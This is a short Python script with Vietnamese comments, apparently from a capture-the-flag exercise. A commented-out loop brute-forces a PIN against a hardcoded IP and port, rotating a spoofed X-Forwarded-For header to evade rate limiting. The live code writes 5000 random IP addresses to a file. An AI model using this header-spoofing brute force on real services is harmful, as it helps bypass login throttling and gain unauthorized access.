# import requests

# url = 'http://103.97.125.56:31244/'

# pin = 1000
# for i in range(1, 234):
#     for j in range(0, 5):
#         res = requests.post(url, data={'pin': pin}, headers={'X-Forwarded-For': f'203.0.{i}.197'})
#         pin += 1
        
import random

# Hàm tạo địa chỉ IP ngẫu nhiên
def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

# Tạo 5000 địa chỉ IP ngẫu nhiên
random_ips = [generate_random_ip() for _ in range(5000)]

# Lưu danh sách IP vào tệp tin
with open('random_ips.txt', 'w') as file:
    for ip in random_ips:
        file.write(ip + '\n')

print("Đã tạo 5000 địa chỉ IP ngẫu nhiên và lưu vào tệp 'random_ips.txt'.")
